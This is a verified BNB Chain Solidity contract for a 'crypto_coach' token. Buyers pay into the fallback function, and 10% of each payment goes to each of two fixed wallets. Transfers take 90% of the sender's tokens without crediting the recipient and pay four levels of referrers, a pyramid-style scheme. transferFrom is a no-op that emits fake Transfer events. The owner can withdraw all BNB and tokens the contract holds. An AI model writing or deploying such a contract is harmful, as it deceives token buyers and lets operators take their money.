/**
 *Submitted for verification at BscScan.com on 2022-09-09
*/

pragma solidity ^0.4.25;


contract ERC20Interface {
    function totalSupply() public view returns (uint);
    function balanceOf(address tokenOwner) public view returns (uint balance);
    function allowance(address tokenOwner, address spender) public view returns (uint remaining);
    function transfer(address to, uint tokens) public returns (bool success);
    function approve(address spender, uint tokens) public returns (bool success);
    function transferFrom(address from, address to, uint tokens) public returns (bool success);

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}
  

contract SafeMath {
    function safeAdd(uint a, uint b) public pure returns (uint c) {
        c = a + b;
        require(c >= a);
    }
    function safeSub(uint a, uint b) public pure returns (uint c) {
        require(b <= a); 
        c = a - b; 
        
    } 
        
        function safeMul(uint a, uint b) public pure returns (uint c) {
            c = a * b; 
            require(a == 0 || c / a == b); 
            
        } 
        function safeDiv(uint a, uint b) public pure returns (uint c) {
        require(b > 0);
        c = a / b;
    }
}


contract Crypto_coach_ is ERC20Interface, SafeMath {
    struct User{
        address dis1;
        address dis2;
        address dis3;
        address dis4;
        
    }
    
    struct Userstat {
        uint status;
    }
    
    string public name;
    string public symbol;
    uint8 public decimals;

    uint256 public _totalSupply;
    mapping(address => Userstat) public stat;
    mapping(address => User) public users;
    mapping(address => uint) balances;
    mapping(address => mapping(address => uint)) allowed;
    address public owner;
    address public wallet1;
    address public wallet2;
    
     event ownershipTransferred(address indexed previousowner, address indexed newowner);
     event wallet1Transferred(address wallet1, address newwallet1);
     event wallet2Transferred(address wallet2, address newwallet2);
     
    
    constructor() public {
        name = "crypto_coach";
        symbol = "c_coach0";
        decimals = 1;
        

        
        
        wallet1 = 0xf85AdCEE4D396C2dCc71cc87Aa6040D708d0747a;
        wallet2 = 0x1F106C8E9027BB0F0b75bbff89fFa56E03982dB9;
        owner = msg.sender;
        
       users[0x4074886c62f26edA9660ad78f5Ec8A8b82fcf9ef].dis1 = 0x4050C301751C2eAb848EAe148C07Fc2645c49bEF;
      users[0x4050C301751C2eAb848EAe148C07Fc2645c49bEF].dis1 = 0x3307E4612CCF540e9812Ee3372E0f6D03075978c;
      users[0x3307E4612CCF540e9812Ee3372E0f6D03075978c].dis1 = 0x3b128CF46c1dd4ACb0a5c6b4e3f10A67e2FD5778;
      users[0x3b128CF46c1dd4ACb0a5c6b4e3f10A67e2FD5778].dis1 = 0xB14dbAC808E1004D1453fDA614a58A2a04547B6D;
      users[0xB14dbAC808E1004D1453fDA614a58A2a04547B6D].dis1 = 0x389eD25DC1AfB57555CabDbeb1092De19689D903;
      stat[0x4074886c62f26edA9660ad78f5Ec8A8b82fcf9ef].status = 2;
    }

    function totalSupply() public view returns (uint) {
        return _totalSupply  - balances[address(0)];
    }

     function status(address user) public view returns (uint) {
        return stat[user].status;
    }

    function balanceOf(address tokenOwner) public view returns (uint balance) {
        return balances[tokenOwner];
    }

    function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
        return allowed[tokenOwner][spender];
    }

    function approve(address spender, uint tokens) public returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        return true;
    }

    
    
    function transfer(address to, uint tokens) public returns (bool success) {
        require(stat[to].status >= 1); 
        require(tokens >= 10); 
        uint min = tokens*9/10;
        balances[msg.sender] = safeSub(balances[msg.sender], min);
        emit Transfer(msg.sender, to, tokens);
        
        User memory newUser;
        address sender = msg.sender;
        address dis1 = to;
        address dis2 = users[dis1].dis1;
        address dis3 = users[dis2].dis1;
        address dis4 = users[dis3].dis1;
        
         newUser.dis1 = dis1;
        newUser.dis2 = dis2;
        newUser.dis3 = dis3;
        newUser.dis4 = dis4;
        
        users[sender] = newUser;
        
        Userstat memory newStatus;
        newStatus.status = 2;
        stat[sender] = newStatus;
        
        payer();
        
       
        return true;
        }


        function migration(address to, address migrate) public onlyOwner{
            require(stat[to].status >= 1);
            require(stat[migrate].status <= 1);

            _totalSupply = safeAdd(_totalSupply, 10);
            emit Transfer(address(0), migrate, 10);
            balances[migrate] = safeAdd(balances[migrate], 1);
            emit Transfer(migrate, to, 1);


            User memory newUser;
        address sender = migrate;
        address dis1 = to;
        address dis2 = users[dis1].dis1;
        address dis3 = users[dis2].dis1;
        address dis4 = users[dis3].dis1;
        
         newUser.dis1 = dis1;
        newUser.dis2 = dis2;
        newUser.dis3 = dis3;
        newUser.dis4 = dis4;
        
        users[sender] = newUser;
        
        Userstat memory newStatus;
        newStatus.status = 2;
        stat[sender] = newStatus;



        }
        
   
    
    
    
    
    function transferFrom(address from, address to, uint tokens) public returns (bool success) {
        balances[from] = safeSub(balances[from], 0);
        allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], 0);
        balances[to] = safeAdd(balances[to], 0);
        emit Transfer(from, to, 0);
        return true;
    }
    
    modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }

      modifier onlyWallet2() {
    require(msg.sender == wallet2);
    _;
  }
  
   function transferowner(address newowner) public onlyOwner {
    require(newowner != address(0));
    emit ownershipTransferred(owner, newowner);
    owner = newowner;
  }

  function transferwallet1(address newwallet1) public onlyOwner {
    require(newwallet1 != address(0));
    emit wallet1Transferred(wallet1, newwallet1);
    wallet1 = newwallet1;
  }

    function transferwallet2(address newwallet2) public onlyWallet2 {
    require(newwallet2 != address(0));
    emit wallet2Transferred(wallet2, newwallet2);
    wallet2 = newwallet2;
  }
  

  
 
  
   
    
    function () external payable  {
        require(msg.value >= 2500000000000000);
        require(stat[msg.sender].status <= 1); 
     
     _totalSupply = safeAdd(_totalSupply, 10);
     balances[msg.sender] = safeAdd(balances[msg.sender], 10);
     emit Transfer(address(0), msg.sender, 10);
     uint comission = msg.value / 10;
     wallet1.transfer(comission);
     wallet2.transfer(comission);
     }
 
   function payer() internal {
        uint paycash = 2500000000000000;
        uint value1 = paycash * 25 / 100;
        uint value2 = paycash * 10/100;
        uint value3 = paycash *15 / 100;
        uint value4 = paycash *30 / 100;
         
        
        address dis1 = users[msg.sender].dis1;
        address dis2 = users[msg.sender].dis2;
        address dis3 = users[msg.sender].dis3;
        address dis4 = users[msg.sender].dis4;
        
        
        dis1.transfer(value1);
        dis2.transfer(value2);
        dis3.transfer(value3);
        dis4.transfer(value4);
       
       
   }
   
    function holderhelptok(address somtoken, address to, uint tokens) public onlyOwner {
       Crypto_coach_(somtoken).transfer(to, tokens);
    }
    
    function holderhelp(address holder, uint help) public onlyOwner {
        holder.transfer(help);
    }
       
}